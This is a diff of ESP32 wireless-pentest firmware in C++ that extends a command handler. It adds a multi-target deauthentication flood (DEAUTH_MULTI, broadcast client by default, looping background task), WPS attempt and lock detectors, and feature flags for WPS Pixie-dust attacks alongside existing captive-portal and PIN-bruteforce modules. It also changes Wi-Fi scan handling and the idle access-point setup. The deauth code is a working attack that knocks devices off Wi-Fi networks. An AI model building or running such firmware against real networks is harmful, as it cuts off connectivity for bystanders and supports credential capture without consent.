+        for (JsonVariant value : channelsArray) {
+            const uint8_t channel = value.as<uint8_t>();
+            if (!isValidWifiChannel(channel)) {
+                proto.sendResp(id, false, "invalid channel");
+                return;
+            }
+            String regulatoryError;
+            if (!validateRegulatoryChannel(channel, regulatoryError)) {
+                proto.sendResp(id, false, regulatoryError.c_str());
+                return;
+            }
+            bool duplicate = false;
+            for (size_t existing = 0; existing < channelCount; ++existing) {
+                if (channels[existing] == channel) {
+                    duplicate = true;
+                    break;
+                }
+            }
+            if (!duplicate && channelCount < sizeof(channels)) {
+                channels[channelCount++] = channel;
+            }
+        }
+
+        uint8_t targets[32][6] = {};
+        size_t targetCount = 0;
+        JsonArray targetsArray = doc["args"]["targets"].as<JsonArray>();
+        for (JsonVariant value : targetsArray) {
+            const char* bssidStr = value.as<const char*>();
+            if (bssidStr == nullptr || targetCount >= 32) continue;
+            if (parseMac(bssidStr, targets[targetCount])) {
+                targetCount++;
+            }
+        }
+
+        uint16_t hopIntervalMs = doc["args"]["interval_ms"] | 300;
+        radioIdle();
+        const bool ok = wpsAttemptDetector.start(
+            channelCount > 0 ? channels : nullptr,
+            channelCount,
+            targetCount > 0 ? &targets[0][0] : nullptr,
+            targetCount,
+            hopIntervalMs,
+            bandMode != WifiBandMode::BAND_2G
+        );
+        JsonDocument resp;
+        resp["ok"] = ok;
+        if (ok) {
+            resp["active"] = true;
+            resp["hopping"] = wpsAttemptDetector.hopping();
+            resp["channel"] = wpsAttemptDetector.channel();
+            resp["channels"] = channelCount;
+            resp["targets"] = targetCount;
+            resp["interval_ms"] = hopIntervalMs;
+        } else {
+            resp["error"] = "wps_attempt_detect_start_failed";
+        }
+        String json;
+        serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+    }
+    else if (strcmp(cmd, "WPS_ATTEMPT_DETECT_STOP") == 0) {
+        wpsAttemptDetector.stop();
+        JsonDocument resp;
+        resp["ok"] = true;
+        resp["sessions"] = wpsAttemptDetector.sessionCount();
+        resp["frames"] = wpsAttemptDetector.frameCount();
+        String json;
+        serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+    }
+    else if (strcmp(cmd, "WPS_ATTEMPT_DETECT_STATUS") == 0) {
+        JsonDocument resp;
+        resp["ok"] = true;
+        resp["active"] = wpsAttemptDetector.active();
+        resp["channel"] = wpsAttemptDetector.channel();
+        resp["hopping"] = wpsAttemptDetector.hopping();
+        resp["sessions"] = wpsAttemptDetector.sessionCount();
+        resp["frames"] = wpsAttemptDetector.frameCount();
+        String json;
+        serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+    }
+
     // ── REGULATORY COUNTRY ────────────────────────────────────────────────
     else if (strcmp(cmd, "SET_COUNTRY") == 0) {
         String requested = doc["args"]["country"] | "";
@@ -794,7 +1488,7 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         resp["device_id"] = getDeviceId();
         char countryCode[4] = {0};
         if (esp_wifi_get_country_code(countryCode) != ESP_OK) {
-            strcpy(countryCode, "01");
+            strcpy(countryCode, "CH");
         }
         resp["country"] = countryCode;
         appendAllowedWifiChannels(resp);
@@ -809,6 +1503,7 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         features.add("nrugochi");
         features.add("client_detect");
         features.add("deauth");
+        features.add("deauth_multi");
         features.add("deauth_detect");
         features.add("beacon");
         features.add("portal");
@@ -816,6 +1511,11 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         features.add("html_diag");
         features.add("stop_all");
         features.add("wps");
+        features.add("wps_lock_detect");
+        features.add("wps_attempt_detect");
+        #if WPS_PIXIE_SUPPORTED
+            features.add("wps_pixie");
+        #endif
         features.add("hidden_ap");
         features.add("storage");
         features.add("ld2450");
@@ -1243,33 +1943,56 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
 
     // ── SCAN_WIFI ─────────────────────────────────────────────────────────
     else if (strcmp(cmd, "SCAN_WIFI") == 0) {
-        const char* band = doc["args"]["band"] | "auto";
-        WifiBandMode bandMode = WifiBandMode::BAND_2G;
-        String bandError;
-        if (!configureWifiBand(band, bandMode, bandError)) {
-            proto.sendResp(id, false, bandError.c_str());
-            return;
-        }
-
         bool wasSniffing = sniffer.active();
         uint8_t prevChannel = sniffer.channel();
         bool wasHopping = sniffer.hopping();
 
         radioIdle();
 
-        int n = idf_scan_networks(proto);
+        const char* band = doc["args"]["band"] | "auto";
+        WifiBandMode bandMode = WifiBandMode::BAND_2G;
+        String bandError;
+        if (!configureWifiBand(band, bandMode, bandError, false)) {
+            proto.sendResp(id, false, bandError.c_str());
+            return;
+        }
+
+        uint32_t settleMs = doc["args"]["settle_ms"] | WIFI_SCAN_DEFAULT_SETTLE_MS;
+        settleMs = constrain(settleMs, WIFI_SCAN_MIN_SETTLE_MS, WIFI_SCAN_MAX_SETTLE_MS);
+        uint16_t dwellMs = doc["args"]["dwell_ms"] | WIFI_SCAN_DEFAULT_DWELL_MS;
+        dwellMs = constrain(dwellMs, WIFI_SCAN_MIN_DWELL_MS, WIFI_SCAN_MAX_DWELL_MS);
+        int n = idf_scan_networks(proto, bandMode, settleMs, dwellMs);
+        if (n == -2) {
+            proto.sendResp(id, false, "scan already in progress");
+            return;
+        }
         if (n < 0) {
             proto.sendResp(id, false, "scan failed");
             return;
         }
 
+        int emittedCount = 0;
         if (n > 0) {
             uint16_t count = (uint16_t)n;
             wifi_ap_record_t* records = (wifi_ap_record_t*)malloc(
                 count * sizeof(wifi_ap_record_t));
 
-            if (records && esp_wifi_scan_get_ap_records(&count, records) == ESP_OK) {
+            esp_err_t recordsErr = records
+                ? esp_wifi_scan_get_ap_records(&count, records)
+                : ESP_ERR_NO_MEM;
+            if (recordsErr == ESP_OK) {
                 for (int i = 0; i < count; i++) {
+                    // The C5 scan bitmap can still return both bands in some
+                    // IDF/board states. Enforce the requested band here so the
+                    // app never receives cross-band results for an explicit
+                    // 2.4/5 GHz scan.
+                    if (bandMode == WifiBandMode::BAND_2G && records[i].primary >= 36) {
+                        continue;
+                    }
+                    if (bandMode == WifiBandMode::BAND_5G && records[i].primary < 36) {
+                        continue;
+                    }
+
                     char bssid_str[18];
                     snprintf(bssid_str, sizeof(bssid_str),
                              "%02X:%02X:%02X:%02X:%02X:%02X",
@@ -1286,17 +2009,33 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
                     ev["wps"]      = (bool)records[i].wps;
                     ev["band"]     = wifiBandForChannel(records[i].primary);
                     proto.sendEvent("scan_ap", ev);
+                    emittedCount++;
                 }
+            } else {
+                Serial.printf(
+                    "SCAN_WIFI: esp_wifi_scan_get_ap_records failed: %s (%d), records=%s\n",
+                    esp_err_to_name(recordsErr),
+                    (int)recordsErr,
+                    records ? "allocated" : "malloc-failed"
+                );
             }
             free(records);
         }
 
-        esp_wifi_scan_stop();
+        finishWifiScan(true);
+        Serial.printf(
+            "SCAN_WIFI: response raw_count=%d emitted_count=%d band=%s\n",
+            n,
+            emittedCount,
+            wifiBandModeName(bandMode)
+        );
 
         JsonDocument resp;
         resp["ok"] = true;
-        resp["count"] = n;
+        resp["count"] = emittedCount;
+        resp["scanned"] = n;
         resp["band"] = wifiBandModeName(bandMode);
+        resp["dwell_ms"] = dwellMs;
         String json; serializeJson(resp, json);
         proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
 
@@ -1305,6 +2044,161 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
             if (wasHopping) sniffer.startHop(300);
             else sniffer.startFixed(prevChannel, isWifi5GhzEnabled());
         }
+    }
+
+    // ── DEAUTH_MULTI ─────────────────────────────────────────────────────
+    // Firmware-native multi-target deauth with per-target channel scheduling.
+    else if (strcmp(cmd, "DEAUTH_MULTI") == 0) {
+        JsonVariant args = doc["args"];
+        JsonArray targets = args["targets"].as<JsonArray>();
+        if (targets.isNull() || targets.size() == 0) {
+            proto.sendResp(id, false, "targets required");
+            return;
+        }
+        if (targets.size() > deauth_multi::kMaxTargets) {
+            proto.sendResp(id, false, "too many targets");
+            return;
+        }
+
+        const char* clientStr = args["client"] | "FF:FF:FF:FF:FF:FF";
+        uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+        if (!parseMac(clientStr, client)) {
+            proto.sendResp(id, false, "invalid client");
+            return;
+        }
+
+        gDeauthMultiTargetCount = 0;
+        for (JsonVariant targetVar : targets) {
+            const char* bssidStr = targetVar["bssid"] | "";
+            uint8_t channel = targetVar["channel"].as<uint8_t>();
+            uint8_t bssid[6] = {0};
+            if (!parseMac(bssidStr, bssid)) {
+                proto.sendResp(id, false, "invalid target bssid");
+                return;
+            }
+            if (!isValidWifiChannel(channel)) {
+                proto.sendResp(id, false, "invalid target channel");
+                return;
+            }
+            String regulatoryError;
+            if (!validateRegulatoryChannel(channel, regulatoryError)) {
+                proto.sendResp(id, false, regulatoryError.c_str());
+                return;
+            }
+            bool duplicate = false;
+            for (size_t existing = 0; existing < gDeauthMultiTargetCount; ++existing) {
+                if (memcmp(gDeauthMultiTargets[existing].bssid, bssid, 6) == 0) {
+                    duplicate = true;
+                    break;
+                }
+            }
+            if (duplicate) {
+                proto.sendResp(id, false, "duplicate target bssid");
+                return;
+            }
+            DeauthMultiTarget& target = gDeauthMultiTargets[gDeauthMultiTargetCount++];
+            target = DeauthMultiTarget{};
+            memcpy(target.bssid, bssid, 6);
+            target.channel = channel;
+        }
+
+        const char* modeStr = args["mode"] | "burst";
+        const bool loopMode = strcmp(modeStr, "loop") == 0;
+        if (!loopMode && strcmp(modeStr, "burst") != 0) {
+            proto.sendResp(id, false, "invalid mode");
+            return;
+        }
+
+        uint32_t count = args["count"].as<uint32_t>();
+        if (count == 0) count = 20;
+        count = deauth_multi::clampFrameCount(count);
+        uint32_t durationSec = args["duration"].as<uint32_t>();
+        durationSec = deauth_multi::clampDurationSec(durationSec);
+        uint16_t intervalMs = deauth_multi::kDefaultIntervalMs;
+        if (args["interval_ms"].is<uint16_t>()) {
+            intervalMs = args["interval_ms"].as<uint16_t>();
+        } else if (args["deauth_interval_ms"].is<uint16_t>()) {
+            intervalMs = args["deauth_interval_ms"].as<uint16_t>();
+        }
+        intervalMs = deauth_multi::clampIntervalMs(intervalMs);
+        uint8_t reason = args["reason"].is<uint8_t>() ? args["reason"].as<uint8_t>() : 7;
+
+        radioIdle();
+
+        memcpy(gDeauthMultiClient, client, 6);
+        gDeauthMultiCountPerTarget = count;
+        gDeauthMultiDurationSec = durationSec;
+        gDeauthMultiIntervalMs = intervalMs;
+        gDeauthMultiReason = reason;
+
+        if (loopMode) {
+            gDeauthMultiSent = 0;
+            gDeauthMultiFailed = 0;
+            gDeauthMultiStartedMs = millis();
+            gDeauthMultiCurrentChannel = 0;
+            gDeauthMultiCurrentBssid[0] = '\0';
+            gDeauthMultiStopRequested = false;
+            gDeauthMultiActive = true;
+            for (size_t i = 0; i < gDeauthMultiTargetCount; ++i) {
+                gDeauthMultiTargets[i].requested = 0;
+                gDeauthMultiTargets[i].sent = 0;
+                gDeauthMultiTargets[i].failed = 0;
+            }
+
+            BaseType_t created = xTaskCreate(
+                deauthMultiTaskFn,
+                "deauthMulti",
+                4096,
+                nullptr,
+                1,
+                &gDeauthMultiTaskHandle
+            );
+            if (created != pdPASS) {
+                gDeauthMultiActive = false;
+                gDeauthMultiTaskHandle = nullptr;
+                proto.sendResp(id, false, "failed to start deauth multi task");
+                return;
+            }
+
+            JsonDocument resp;
+            resp["ok"] = true;
+            resp["mode"] = "multi";
+            resp["active"] = true;
+            resp["target_count"] = gDeauthMultiTargetCount;
+            resp["count"] = gDeauthMultiCountPerTarget;
+            resp["duration"] = gDeauthMultiDurationSec;
+            resp["interval_ms"] = gDeauthMultiIntervalMs;
+            resp["requested_frames"] = 0;
+            resp["sent_frames"] = 0;
+            resp["failed_frames"] = 0;
+            resp["elapsed_ms"] = 0;
+            resp["pps"] = 0.0f;
+            appendDeauthMultiTargets(resp);
+            String json;
+            serializeJson(resp, json);
+            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+            return;
+        }
+
+        runDeauthMultiBurst();
+        const uint32_t elapsedMs = millis() - gDeauthMultiStartedMs;
+        JsonDocument resp;
+        resp["ok"] = true;
+        resp["mode"] = "multi";
+        resp["active"] = false;
+        resp["target_count"] = gDeauthMultiTargetCount;
+        resp["count"] = gDeauthMultiCountPerTarget;
+        resp["duration"] = gDeauthMultiDurationSec;
+        resp["interval_ms"] = gDeauthMultiIntervalMs;
+        resp["requested_frames"] = deauthMultiRequestedTotal();
+        resp["sent_frames"] = gDeauthMultiSent;
+        resp["failed_frames"] = gDeauthMultiFailed;
+        resp["elapsed_ms"] = elapsedMs;
+        resp["pps"] = framesPerSecond(gDeauthMultiSent, elapsedMs);
+        appendDeauthMultiTargets(resp);
+        String json;
+        serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
     }
 
     // ── DEAUTH_BURST (capture-preserving) ────────────────────────────────
@@ -1387,6 +2281,8 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         resp["sent_frames"] = stats.sent;
         resp["failed_frames"] = stats.failed;
         resp["interval_ms"] = intervalMs;
+        resp["elapsed_ms"] = stats.elapsedMs;
+        resp["pps"] = framesPerSecond(stats.sent, stats.elapsedMs);
         String json;
         serializeJson(resp, json);
         proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
@@ -1394,13 +2290,27 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
 
     // ── DEAUTH_STOP ──────────────────────────────────────────────────────
     else if (strcmp(cmd, "DEAUTH_STOP") == 0) {
-        const uint32_t sent = gDeauthLoopSent;
-        const uint32_t failed = gDeauthLoopFailed;
+        const bool multiWasActive =
+            gDeauthMultiActive || gDeauthMultiTaskHandle != nullptr;
+        const uint32_t sent = multiWasActive ? gDeauthMultiSent : gDeauthLoopSent;
+        const uint32_t failed = multiWasActive ? gDeauthMultiFailed : gDeauthLoopFailed;
+        const uint32_t startedMs = multiWasActive
+            ? gDeauthMultiStartedMs
+            : gDeauthLoopStartedMs;
+        const uint32_t elapsedMs = startedMs == 0 ? 0 : (millis() - startedMs);
         stopDeauthLoopAndWait();
+        stopDeauthMultiLoopAndWait();
         JsonDocument resp;
         resp["ok"] = true;
+        resp["mode"] = multiWasActive ? "multi" : "loop";
         resp["sent_frames"] = sent;
         resp["failed_frames"] = failed;
+        resp["elapsed_ms"] = elapsedMs;
+        resp["pps"] = framesPerSecond(sent, elapsedMs);
+        if (multiWasActive) {
+            resp["target_count"] = gDeauthMultiTargetCount;
+            appendDeauthMultiTargets(resp);
+        }
         String json;
         serializeJson(resp, json);
         proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
@@ -1539,6 +2449,8 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         statsDoc["sent_frames"] = stats.sent;
         statsDoc["failed_frames"] = stats.failed;
         statsDoc["interval_ms"] = intervalMs;
+        statsDoc["elapsed_ms"] = stats.elapsedMs;
+        statsDoc["pps"] = framesPerSecond(stats.sent, stats.elapsedMs);
         statsDoc["reason"] = reason;
         proto.sendEvent("deauth_stats", statsDoc);
 
@@ -1550,6 +2462,8 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         resp["sent_frames"] = stats.sent;
         resp["failed_frames"] = stats.failed;
         resp["interval_ms"] = intervalMs;
+        resp["elapsed_ms"] = stats.elapsedMs;
+        resp["pps"] = framesPerSecond(stats.sent, stats.elapsedMs);
         String json;
         serializeJson(resp, json);
         proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
@@ -1805,19 +2719,26 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
             resp["error"] = "regulatory_channel_blocked";
             resp["msg"] = regulatoryError;
             resp["channel"] = channel;
-            resp["country"] = cc[0] ? cc : "01";
+            resp["country"] = cc[0] ? cc : "CH";
             appendAllowedWifiChannels(resp);
             String json; serializeJson(resp, json);
             proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
             return;
         }
         const char* bssidStr = doc["args"]["bssid"] | "";
+        const bool showNotice = doc["args"]["show_notice"] | true;
 
         uint8_t targetBssid[6] = {0};
         bool hasTarget = parseMac(bssidStr, targetBssid);
 
         String portalError;
-        bool started = portal.start(ssid, channel, hasTarget ? targetBssid : nullptr, &portalError);
+        bool started = portal.start(
+            ssid,
+            channel,
+            hasTarget ? targetBssid : nullptr,
+            showNotice,
+            &portalError
+        );
         if (started) {
             proto.sendResp(id, true, "portal started");
         } else {
@@ -2695,14 +3616,21 @@ void setup() {
     WiFi.mode(WIFI_MODE_APSTA);
     applyStoredWifiCountry();
 
-    // Configure a minimal hidden AP so WIFI_IF_AP is always valid for TX.
-    wifi_config_t ap_cfg = {};
-    strcpy((char*)ap_cfg.ap.ssid, "nrcap32");
-    ap_cfg.ap.ssid_len       = 7;
-    ap_cfg.ap.ssid_hidden    = 1;
-    ap_cfg.ap.max_connection = 0;
-    ap_cfg.ap.channel        = 1;  // default, will be changed by deauth/portal
-    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
+    // Configure a hidden, protected AP so WIFI_IF_AP is always valid for TX
+    // without exposing the Arduino default open ESP_XXXXXX SoftAP.
+    {
+        char idleSsid[24]{};
+        char idlePass[9]{};
+        static const char kIdleChars[] =
+            "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
+        const uint32_t seed = esp_random();
+        snprintf(idleSsid, sizeof(idleSsid), "NRSuite-Idle-%06x", seed & 0xffffff);
+        for (size_t i = 0; i < 8; ++i) {
+            idlePass[i] = kIdleChars[(seed >> ((i % 4) * 8)) % (sizeof(kIdleChars) - 1)];
+        }
+        idlePass[8] = '\0';
+        WiFi.softAP(idleSsid, idlePass, 1, 1, 1);
+    }
 
     // Ensure promiscuous is OFF at boot
     esp_wifi_set_promiscuous(false);
@@ -2746,6 +3674,9 @@ void setup() {
     pinBruteforce.begin(proto);
     irRemote.begin(proto);
     pn532Nfc.begin(proto);
+    wpsPixie.begin(proto);
+    wpsLockDetector.begin(proto);
+    wpsAttemptDetector.begin(proto);
     #ifdef ENABLE_BLE_HID
         bleScanner.begin(proto);
         bleProfile.begin(proto);
@@ -2774,6 +3705,8 @@ void loop() {
     emitLd2450Events();
     irRemote.update();
     pn532Nfc.update();
+    wpsPixie.update();
+    wpsAttemptDetector.update();
     #ifdef ENABLE_BLE_HID
         bleScanner.update();
         bleProfile.update();
